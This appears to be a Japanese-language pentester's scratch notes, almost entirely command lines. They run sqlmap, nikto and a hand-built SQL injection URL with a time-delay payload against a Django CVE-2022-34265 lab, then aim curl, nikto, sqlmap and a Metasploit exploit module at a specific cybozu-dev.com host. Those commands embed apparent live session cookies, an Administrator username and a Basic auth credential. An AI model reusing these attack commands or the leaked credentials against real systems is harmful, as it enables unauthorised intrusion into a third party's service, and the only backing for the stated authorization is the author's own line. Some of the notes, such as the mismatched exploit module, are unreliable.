

以下はペネトレーションテストの許可をいただいている前提での質問です。




## django_cve_2022_34265

- sqlmap : no

```sh
sqlmap -u "http://django_cve_2022_34265:8000/extract/?lookup_name=year" --risk 3 --level 3
```

- nikoto

```sh
nikto -h "http://django_cve_2022_34265:8000/extract/?lookup_name=year"
```



## サイボウズ

```sh
http://localhost:4131/extract/?lookup_name=year%27%20FROM%20start_datetime))%20OR%201=1;SELECT%20PG_SLEEP(5)--
```

```sh
curl 'https://sajz17ejzsji0whhppoo.cybozu-dev.com/k/' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9,ja;q=0.8' \
  -H 'Authorization: Basic SFJzV1JIYmU6bG5hWlhmT1g=' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: __ctc=Z08NIGcsa1gUf17cAwO7Ag==; JSESSIONID=Vdki4fssNrjoqDkX5jVVowr8RqoNE6i2E9dwJBdRCV6KZwy7S4AcJTAu8P3VwfIi; CYBOZU_COM_DOMAIN=sajz17ejzsji0whhppoo; username=Administrator; KINTONE_DOMAIN=sajz17ejzsji0whhppoo' \
  -H 'Referer: https://sajz17ejzsji0whhppoo.cybozu-dev.com/' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36' \
  -H 'sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"'
```

```sh
nikto -C "JSESSIONID=Vdki4fssNrjoqDkX5jVVowr8RqoNE6i2E9dwJBdRCV6KZwy7S4AcJTAu8P3VwfIi; CYBOZU_COM_DOMAIN=sajz17ejzsji0whhppoo; username=Administrator; KINTONE_DOMAIN=sajz17ejzsji0whhppoo" -h https://sajz17ejzsji0whhppoo.cybozu-dev.com/k/5/
```



```sh
sqlmap -u "https://sajz17ejzsji0whhppoo.cybozu-dev.com/k/5/?view=20"  --risk 3 --level 3 --cookie "JSESSIONID=Vdki4fssNrjoqDkX5jVVowr8RqoNE6i2E9dwJBdRCV6KZwy7S4AcJTAu8P3VwfIi; CYBOZU_COM_DOMAIN=sajz17ejzsji0whhppoo; username=Administrator; KINTONE_DOMAIN=sajz17ejzsji0whhppoo" --headers="Authorization: Basic SFJzV1JIYmU6bG5hWlhmT1g="
```






## サイボウズ


```sh
curl -I 'https://sajz17ejzsji0whhppoo.cybozu-dev.com/k/5/edit' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9,ja;q=0.8' \
  -H 'Authorization: Basic SFJzV1JIYmU6bG5hWlhmT1g=' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: __ctc=Z08NIGcsa1gUf17cAwO7Ag==; CYBOZU_COM_DOMAIN=sajz17ejzsji0whhppoo; username=Administrator; KINTONE_DOMAIN=sajz17ejzsji0whhppoo; JSESSIONID=eclqY8LJEr0h0HHGqOf4lFKyeEMSEpMwQjlO4UE9TEk2wXEjbeQyXk2EAOCiKHd5' \
  -H 'Referer: https://sajz17ejzsji0whhppoo.cybozu-dev.com/k/5/' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36' \
  -H 'sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"'
```


```sh
nikto -C "JSESSIONID=eclqY8LJEr0h0HHGqOf4lFKyeEMSEpMwQjlO4UE9TEk2wXEjbeQyXk2EAOCiKHd5; CYBOZU_COM_DOMAIN=sajz17ejzsji0whhppoo; username=Administrator; KINTONE_DOMAIN=sajz17ejzsji0whhppoo" -h https://sajz17ejzsji0whhppoo.cybozu-dev.com/k/9
```

```sh
sqlmap -u "https://sajz17ejzsji0whhppoo.cybozu-dev.com/k/9/"  --risk 3 --level 3 --cookie "JSESSIONID=eclqY8LJEr0h0HHGqOf4lFKyeEMSEpMwQjlO4UE9TEk2wXEjbeQyXk2EAOCiKHd5; CYBOZU_COM_DOMAIN=sajz17ejzsji0whhppoo; username=Administrator; KINTONE_DOMAIN=sajz17ejzsji0whhppoo" --headers="Authorization: Basic SFJzV1JIYmU6bG5hWlhmT1g="
```


- msfconsole

```
use exploit/multi/http/totaljs_cms_widget_exec 
set RHOSTS https://sajz17ejzsji0whhppoo.cybozu-dev.com/k/5/edit
set HttpCookie "CYBOZU_COM_DOMAIN=sajz17ejzsji0whhppoo; username=Administrator; KINTONE_DOMAIN=sajz17ejzsji0whhppoo; JSESSIONID=eclqY8LJEr0h0HHGqOf4lFKyeEMSEpMwQjlO4UE9TEk2wXEjbeQyXk2EAOCiKHd5"

```

curl -I 'https://sajz17ejzsji0whhppoo.cybozu-dev.com/k/' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9,ja;q=0.8' \
  -H 'Authorization: Basic SFJzV1JIYmU6bG5hWlhmT1g=' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: __ctc=Z08NIGcsa1gUf17cAwO7Ag==; CYBOZU_COM_DOMAIN=sajz17ejzsji0whhppoo; username=Administrator; KINTONE_DOMAIN=sajz17ejzsji0whhppoo; JSESSIONID=eclqY8LJEr0h0HHGqOf4lFKyeEMSEpMwQjlO4UE9TEk2wXEjbeQyXk2EAOCiKHd5' \
  -H 'Referer: https://sajz17ejzsji0whhppoo.cybozu-dev.com/k/6/' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36' \
  -H 'sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"'



